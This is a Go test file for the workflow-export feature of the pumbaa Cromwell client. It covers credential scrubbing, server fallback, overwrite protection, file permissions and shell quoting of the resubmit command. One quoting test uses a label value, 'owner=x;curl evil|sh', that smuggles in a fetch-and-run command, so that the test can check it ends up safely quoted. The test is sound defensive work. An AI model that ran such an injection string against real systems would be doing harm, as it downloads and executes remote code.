package workflow

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/lmtani/pumbaa/internal/application/ports"
	"github.com/lmtani/pumbaa/internal/domain/workflow"
)

const exportHost = "http://localhost:8000"

type stubSubmissionReader struct {
	sub   *workflow.Submission
	err   error
	calls int
}

func (s *stubSubmissionReader) GetSubmission(_ context.Context, _ string) (*workflow.Submission, error) {
	s.calls++
	if s.err != nil {
		return nil, s.err
	}
	return s.sub, nil
}

const importingWDL = "version 1.0\nimport \"lib/tasks.wdl\" as lib\nworkflow HelloWorld {\n  call lib.hello\n}\n"

func zipWith(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("zip create: %v", err)
		}
		if _, err := w.Write([]byte(content)); err != nil {
			t.Fatalf("zip write: %v", err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zip close: %v", err)
	}
	return buf.Bytes()
}

func exportRecord(files ...ports.RunFile) (*stubRunHistory, ports.RunRecord) {
	rec := historyRecord(exportHost, "run-1", "Succeeded")
	rec.Description = "smoke test"
	rec.Labels = map[string]string{"owner": "lucas"}
	store := newStubRunHistory(rec)
	if files != nil {
		store.files = map[string][]ports.RunFile{"run-1": files}
	}
	return store, rec
}

func keptSet(t *testing.T) []ports.RunFile {
	t.Helper()
	return []ports.RunFile{
		{Kind: ports.RunFileWorkflow, Name: "hello.wdl", Data: []byte(importingWDL)},
		{Kind: ports.RunFileInputs, Name: "hello.inputs.json", Data: []byte(`{"HelloWorld.name": "x"}`)},
		// As submit keeps it: the credential taken out, its name withheld.
		{Kind: ports.RunFileOptions, Name: "prod.options.json", Data: []byte(`{"jes_gcs_root": "gs://b/x"}`), Withheld: []string{"user_service_account_json"}},
		{Kind: ports.RunFileDependencies, Name: "deps.zip", Data: zipWith(t, map[string]string{"lib/tasks.wdl": "version 1.0\ntask hello { command {} }\n"})},
	}
}

func newExport(store ports.RunHistoryReader, server ports.SubmissionReader, files ports.FileProvider) *ExportRunUseCase {
	uc := NewExportRunUseCase(store, server, files, fakeHostProvider{url: exportHost, alias: "local"})
	uc.timeSource = func() time.Time { return time.Date(2026, 11, 5, 10, 0, 0, 0, time.UTC) }
	return uc
}

func readExported(t *testing.T, dir, name string) []byte {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(dir, name))
	if err != nil {
		t.Fatalf("read %s: %v", name, err)
	}
	return data
}

func TestExportWritesTheKeptFilesVerbatim(t *testing.T) {
	store, _ := exportRecord(keptSet(t)...)
	server := &stubSubmissionReader{}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(store, server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if server.calls != 0 {
		t.Error("the server was asked although every file was kept locally")
	}
	if !out.Complete() {
		t.Errorf("Missing = %v, want a complete export", out.Missing)
	}

	kept := keptSet(t)
	for i, name := range []string{ExportWorkflowName, ExportInputsName, ExportOptionsName, ExportDependenciesName} {
		if got := readExported(t, dir, name); !bytes.Equal(got, kept[i].Data) {
			t.Errorf("%s differs from the kept bytes", name)
		}
	}
	if len(out.Files) != 5 {
		t.Fatalf("manifest lists %d files, want 4 submitted ones plus labels", len(out.Files))
	}
	if out.Files[0].Source != ExportFromHistory || out.Files[0].OriginalName != "hello.wdl" {
		t.Errorf("workflow entry = %+v, want source history under its original name", out.Files[0])
	}

	var labels map[string]string
	if err := json.Unmarshal(readExported(t, dir, ExportLabelsName), &labels); err != nil || labels["owner"] != "lucas" {
		t.Errorf("labels.json = %v (%v), want the submitted labels", labels, err)
	}

	var manifest ExportRunOutput
	if err := json.Unmarshal(readExported(t, dir, ExportManifestName), &manifest); err != nil {
		t.Fatalf("manifest.json: %v", err)
	}
	if manifest.WorkflowID != "run-1" || manifest.Host != exportHost || manifest.Description != "smoke test" {
		t.Errorf("manifest = %+v, want the run's identity and note", manifest)
	}

	want := `pumbaa workflow submit -w workflow.wdl -i inputs.json -o options.json -d dependencies.zip -l owner=lucas -D 'smoke test'`
	if out.SubmitCommand != want {
		t.Errorf("submit command = %q, want %q", out.SubmitCommand, want)
	}

	if len(out.Secrets) != 1 || out.Secrets[0] != "user_service_account_json" {
		t.Errorf("Secrets = %v, want the withheld credential reported so it can be added back", out.Secrets)
	}
}

func TestExportQuotesTheSubmitCommandForTheShell(t *testing.T) {
	out := &ExportRunOutput{
		Dir:         "/data/my runs/it's here",
		Description: "budget $5 run, `date` included\nsecond line",
		Labels:      map[string]string{"owner": "x;curl evil|sh", "project": "rnaseq"},
		Files:       []ExportedFile{{Kind: ports.RunFileWorkflow, Name: ExportWorkflowName}},
	}
	out.SubmitCommand = submitCommand(out)

	want := `pumbaa workflow submit -w workflow.wdl -l 'owner=x;curl evil|sh' -l project=rnaseq -D 'budget $5 run, ` + "`date`" + ` included` + "\n" + `second line'`
	if out.SubmitCommand != want {
		t.Errorf("submit command = %q, want %q", out.SubmitCommand, want)
	}
	if got, want := out.ResubmitCommand(), `cd '/data/my runs/it'\''s here' && `+want; got != want {
		t.Errorf("resubmit command = %q, want %q", got, want)
	}
}

func TestShellQuote(t *testing.T) {
	for in, want := range map[string]string{
		"workflow.wdl":     "workflow.wdl",
		"owner=lucas":      "owner=lucas",
		"gs://b/x,y@z%2+1": "gs://b/x,y@z%2+1",
		"":                 "''",
		"two words":        "'two words'",
		"it's":             `'it'\''s'`,
		"~/runs":           "'~/runs'",
		"=ls":              "'=ls'",
		"a*b":              "'a*b'",
	} {
		if got := shellQuote(in); got != want {
			t.Errorf("shellQuote(%q) = %s, want %s", in, got, want)
		}
	}
}

// Options kept before the history stopped keeping credentials still hold
// them until the migration scrubs them; whatever the store returns, the
// export never writes a credential.
func TestExportNeverCarriesCredentials(t *testing.T) {
	store, _ := exportRecord(
		ports.RunFile{Kind: ports.RunFileWorkflow, Name: "hello.wdl", Data: []byte("version 1.0\nworkflow HelloWorld {}\n")},
		ports.RunFile{Kind: ports.RunFileOptions, Name: "prod.options.json", Data: []byte(`{"jes_gcs_root": "gs://b/x", "refresh_token": "1//secret"}`), Withheld: []string{"user_service_account_json"}},
	)
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(store, nil, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if want := []string{"user_service_account_json", "refresh_token"}; strings.Join(out.Secrets, ",") != strings.Join(want, ",") {
		t.Errorf("Secrets = %v, want %v: the withheld one and the one found", out.Secrets, want)
	}
	raw := readExported(t, dir, ExportOptionsName)
	if strings.Contains(string(raw), "secret") {
		t.Errorf("options.json = %s, want the credential gone", raw)
	}
	var options map[string]any
	if err := json.Unmarshal(raw, &options); err != nil || options["jes_gcs_root"] != "gs://b/x" {
		t.Errorf("options.json = %v (%v), want the other options untouched", options, err)
	}
	for _, f := range out.Files {
		if f.Kind == ports.RunFileOptions && !strings.Contains(f.Warning, "add your own") {
			t.Errorf("options warning = %q, want it to say credentials must be supplied again", f.Warning)
		}
	}
}

func TestExportFallsBackToTheServer(t *testing.T) {
	server := &stubSubmissionReader{sub: &workflow.Submission{
		ID:          "run-9",
		Name:        "HelloWorld",
		Labels:      map[string]string{"cromwell-workflow-id": "cromwell-run-9", "sample": "S1"},
		SubmittedAt: time.Date(2026, 10, 1, 8, 0, 0, 0, time.UTC),
		Workflow:    "version 1.0\nworkflow HelloWorld {}\n",
		Inputs:      `{"HelloWorld.name":"x"}`,
		Options:     "{\n  \"read_from_cache\": false\n}",
	}}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(newStubRunHistory(), server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-9", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !out.Complete() {
		t.Errorf("Missing = %v; a workflow without imports needs no zip", out.Missing)
	}
	if out.Name != "HelloWorld" || !out.SubmittedAt.Equal(server.sub.SubmittedAt) {
		t.Errorf("name/submitted = %q/%v, want them from the server", out.Name, out.SubmittedAt)
	}
	if _, ok := out.Labels["cromwell-workflow-id"]; ok || out.Labels["sample"] != "S1" {
		t.Errorf("labels = %v, want Cromwell's own label dropped and the rest kept", out.Labels)
	}
	for _, f := range out.Files {
		if f.Source != ExportFromServer {
			t.Errorf("%s came from %s, want the server", f.Name, f.Source)
		}
	}
	if got := readExported(t, dir, ExportInputsName); string(got) != `{"HelloWorld.name":"x"}` {
		t.Errorf("inputs.json = %q, want the server's exact string", got)
	}
	if !strings.Contains(out.SubmitCommand, "-l sample=S1") || strings.Contains(out.SubmitCommand, "-d ") {
		t.Errorf("submit command = %q", out.SubmitCommand)
	}
}

// A run adopted through `history note` was recorded with the labels the
// server listed, Cromwell's own ID label among them; submitting that again
// would stamp the new run with the old one's ID.
func TestExportDropsCromwellsLabelFromAnAnnotatedRun(t *testing.T) {
	rec := historyRecord(exportHost, "run-1", "Succeeded")
	rec.Origin = ports.OriginNote
	rec.Labels = map[string]string{"cromwell-workflow-id": "cromwell-run-1", "sample": "S1"}
	store := newStubRunHistory(rec)
	server := &stubSubmissionReader{sub: &workflow.Submission{ID: "run-1", Name: "HelloWorld", Workflow: "version 1.0\nworkflow HelloWorld {}\n"}}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(store, server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if _, ok := out.Labels["cromwell-workflow-id"]; ok || out.Labels["sample"] != "S1" {
		t.Errorf("labels = %v, want Cromwell's own label dropped and the rest kept", out.Labels)
	}
	if strings.Contains(out.SubmitCommand, "cromwell-workflow-id") {
		t.Errorf("submit command %q carries the old run's ID label", out.SubmitCommand)
	}
	for _, f := range out.Files {
		if f.Name == ExportLabelsName && f.Source != ExportFromServer {
			t.Errorf("labels.json source = %s, want server: a note never kept labels at submit", f.Source)
		}
	}
}

// Cromwell reports an option it encrypts as the placeholder "cleared"; one
// it does not encrypt is the original submitter's own credential. Neither
// belongs in a submission made from the export, asked or not.
func TestExportDropsCredentialsReadFromTheServer(t *testing.T) {
	server := &stubSubmissionReader{sub: &workflow.Submission{
		ID:       "run-9",
		Name:     "HelloWorld",
		Workflow: "version 1.0\nworkflow HelloWorld {}\n",
		Options:  "{\n  \"jes_gcs_root\": \"gs://b/x\",\n  \"user_service_account_json\": \"cleared\"\n}",
	}}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(newStubRunHistory(), server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-9", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if len(out.Secrets) != 1 || out.Secrets[0] != "user_service_account_json" {
		t.Errorf("Secrets = %v, want the placeholder reported as left out", out.Secrets)
	}
	var options map[string]any
	if err := json.Unmarshal(readExported(t, dir, ExportOptionsName), &options); err != nil {
		t.Fatalf("options.json: %v", err)
	}
	if _, ok := options["user_service_account_json"]; ok || options["jes_gcs_root"] != "gs://b/x" {
		t.Errorf("options.json = %v, want the credential gone and the rest kept", options)
	}
	for _, f := range out.Files {
		if f.Kind == ports.RunFileOptions && !strings.Contains(f.Warning, "add your own") {
			t.Errorf("options warning = %q, want it to say credentials must be supplied again", f.Warning)
		}
	}
}

// Cromwell pretty-prints an empty options object as "{\n\n}" — every run
// submitted without options reads that way. It is no file to export.
func TestExportSkipsEmptyFilesFromTheServer(t *testing.T) {
	server := &stubSubmissionReader{sub: &workflow.Submission{
		ID:       "run-9",
		Name:     "HelloWorld",
		Workflow: "version 1.0\nworkflow HelloWorld {}\n",
		Inputs:   "{ }",
		Options:  "{\n\n}",
	}}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(newStubRunHistory(), server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-9", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if len(out.Files) != 1 || out.Files[0].Kind != ports.RunFileWorkflow {
		t.Errorf("files = %+v, want the workflow alone", out.Files)
	}
	if strings.Contains(out.SubmitCommand, "-o ") || strings.Contains(out.SubmitCommand, "-i ") {
		t.Errorf("submit command = %q, want no empty inputs or options passed", out.SubmitCommand)
	}
	for _, name := range []string{ExportInputsName, ExportOptionsName} {
		if _, err := os.Stat(filepath.Join(dir, name)); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("%s exists (err %v), want nothing written for an empty object", name, err)
		}
	}
}

// A run whose submission time the server did not report has none: the
// manifest must leave the field out rather than claim the year 1.
func TestManifestOmitsAnUnknownSubmissionTime(t *testing.T) {
	raw, err := json.Marshal(&ExportRunOutput{WorkflowID: "run-9", ExportedAt: time.Date(2026, 11, 5, 10, 0, 0, 0, time.UTC)})
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(raw), "submitted_at") {
		t.Errorf("manifest = %s, want no submitted_at for an unknown time", raw)
	}

	raw, err = json.Marshal(&ExportRunOutput{SubmittedAt: time.Date(2026, 10, 1, 8, 0, 0, 0, time.UTC)})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(raw), `"submitted_at":"2026-10-01T08:00:00Z"`) {
		t.Errorf("manifest = %s, want a known submission time kept", raw)
	}
}

func TestExportReportsAMissingDependenciesZip(t *testing.T) {
	server := &stubSubmissionReader{sub: &workflow.Submission{ID: "run-9", Name: "HelloWorld", Workflow: importingWDL}}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(newStubRunHistory(), server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-9", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Complete() || len(out.Missing) != 1 || out.Missing[0].Kind != ports.RunFileDependencies {
		t.Fatalf("Missing = %v, want the dependencies zip reported", out.Missing)
	}
	if !strings.Contains(out.Missing[0].Reason, "lib/tasks.wdl") || !strings.Contains(out.Missing[0].Reason, "submitted the run") {
		t.Errorf("reason = %q, want the import named and who still has the zip", out.Missing[0].Reason)
	}
	if _, err := os.Stat(filepath.Join(dir, ExportDependenciesName)); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("dependencies.zip exists (err %v), want nothing written for a missing file", err)
	}
	if strings.Contains(out.SubmitCommand, "-d ") {
		t.Errorf("submit command %q names a zip that was not written", out.SubmitCommand)
	}
}

func TestExportReadsTheRecordedDependenciesPath(t *testing.T) {
	store, rec := exportRecord()
	rec.DependenciesFile = "/wf/deps.zip"
	rec.WorkflowFile = "/wf/hello.wdl"
	store.records[0] = rec
	server := &stubSubmissionReader{sub: &workflow.Submission{ID: "run-1", Name: "HelloWorld", Workflow: importingWDL}}
	zipData := zipWith(t, map[string]string{"lib/tasks.wdl": "version 1.0\ntask hello { command {} }\n"})
	fp := &mockFileProvider{readBytesFunc: func(_ context.Context, path string) ([]byte, error) {
		if path == "/wf/deps.zip" {
			return zipData, nil
		}
		return nil, errors.New("unexpected path " + path)
	}}
	dir := filepath.Join(t.TempDir(), "out")

	out, err := newExport(store, server, fp).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if !out.Complete() {
		t.Fatalf("Missing = %v, want the zip read from the recorded path", out.Missing)
	}
	var deps *ExportedFile
	for i := range out.Files {
		if out.Files[i].Kind == ports.RunFileDependencies {
			deps = &out.Files[i]
		}
	}
	if deps == nil {
		t.Fatal("no dependencies entry in the manifest")
	}
	if deps.Source != ExportFromPath || !strings.Contains(deps.Warning, "/wf/deps.zip") || strings.Contains(deps.Warning, "does not resolve") {
		t.Errorf("dependencies entry = %+v, want source path with a warning about the path, and no complaint about imports", deps)
	}
	if got := readExported(t, dir, ExportDependenciesName); !bytes.Equal(got, zipData) {
		t.Error("dependencies.zip differs from the file at the recorded path")
	}
	if out.Files[0].Source != ExportFromServer || out.Files[0].OriginalName != "hello.wdl" {
		t.Errorf("workflow entry = %+v, want the server's source under the recorded basename", out.Files[0])
	}
}

func TestExportRefusesToOverwrite(t *testing.T) {
	store, _ := exportRecord(keptSet(t)...)
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ExportWorkflowName), []byte("mine"), 0o644); err != nil {
		t.Fatalf("seed: %v", err)
	}

	_, err := newExport(store, nil, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir})
	if !errors.Is(err, ErrExportWouldOverwrite) || !strings.Contains(err.Error(), ExportWorkflowName) {
		t.Fatalf("err = %v, want ErrExportWouldOverwrite naming workflow.wdl", err)
	}
	if got := readExported(t, dir, ExportWorkflowName); string(got) != "mine" {
		t.Error("the existing file was touched")
	}
	if _, err := os.Stat(filepath.Join(dir, ExportInputsName)); !errors.Is(err, os.ErrNotExist) {
		t.Error("other files were written although the export was refused")
	}

	if _, err := newExport(store, nil, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir, Overwrite: true}); err != nil {
		t.Fatalf("Execute with Overwrite: %v", err)
	}
	if got := readExported(t, dir, ExportWorkflowName); string(got) != importingWDL {
		t.Error("Overwrite did not replace the file")
	}
}

func TestExportKeepsTheOptionsPrivate(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permissions")
	}
	store, _ := exportRecord(keptSet(t)...)
	dir := t.TempDir()
	// A previous options.json left world-readable must not stay that way
	// when the export replaces it.
	if err := os.WriteFile(filepath.Join(dir, ExportOptionsName), []byte("{}"), 0o644); err != nil {
		t.Fatalf("seed: %v", err)
	}

	if _, err := newExport(store, nil, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: dir, Overwrite: true}); err != nil {
		t.Fatalf("Execute: %v", err)
	}
	for name, want := range map[string]os.FileMode{ExportOptionsName: 0o600, ExportWorkflowName: 0o644} {
		info, err := os.Stat(filepath.Join(dir, name))
		if err != nil {
			t.Fatalf("stat %s: %v", name, err)
		}
		if got := info.Mode().Perm(); got != want {
			t.Errorf("%s mode = %o, want %o", name, got, want)
		}
	}
}

// --force over a previous export must not leave that export's files behind:
// another run's dependencies.zip beside this run's workflow would be
// submitted as if it were this run's.
func TestExportOverwriteRemovesAPreviousExportsFiles(t *testing.T) {
	dir := t.TempDir()
	for _, name := range []string{ExportDependenciesName, ExportLabelsName, ExportWorkflowName, "notes.txt"} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte("previous"), 0o644); err != nil {
			t.Fatalf("seed: %v", err)
		}
	}
	server := &stubSubmissionReader{sub: &workflow.Submission{ID: "run-9", Name: "HelloWorld", Workflow: importingWDL}}

	out, err := newExport(newStubRunHistory(), server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-9", Dir: dir, Overwrite: true})
	if err != nil {
		t.Fatalf("Execute: %v", err)
	}
	if out.Complete() {
		t.Fatal("the export claims a zip the server cannot supply")
	}
	for _, name := range []string{ExportDependenciesName, ExportLabelsName} {
		if _, err := os.Stat(filepath.Join(dir, name)); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("%s from the previous export is still there (err %v)", name, err)
		}
	}
	if got := readExported(t, dir, "notes.txt"); string(got) != "previous" {
		t.Error("a file that is not an export file was touched")
	}
	if got := readExported(t, dir, ExportWorkflowName); string(got) != importingWDL {
		t.Error("workflow.wdl was not replaced")
	}
}

func TestExportExplainsWhenNothingCanSupplyTheFiles(t *testing.T) {
	_, err := newExport(newStubRunHistory(), nil, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "ghost", Dir: t.TempDir()})
	if err == nil || !strings.Contains(err.Error(), "no local record") {
		t.Errorf("err = %v, want the absence of a record and a server explained", err)
	}

	store, _ := exportRecord()
	_, err = newExport(store, nil, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: t.TempDir()})
	if err == nil || !strings.Contains(err.Error(), "no files were kept") {
		t.Errorf("err = %v, want the absence of kept files explained", err)
	}

	server := &stubSubmissionReader{sub: &workflow.Submission{ID: "run-1", WorkflowURL: "https://example.org/wf.wdl"}}
	_, err = newExport(store, server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: t.TempDir()})
	if err == nil || !strings.Contains(err.Error(), "https://example.org/wf.wdl") {
		t.Errorf("err = %v, want the URL submission explained", err)
	}

	server = &stubSubmissionReader{err: errors.New("connection refused")}
	_, err = newExport(store, server, nil).Execute(context.Background(), ExportRunInput{WorkflowID: "run-1", Dir: t.TempDir()})
	if err == nil || !strings.Contains(err.Error(), "connection refused") {
		t.Errorf("err = %v, want the server failure surfaced", err)
	}
}
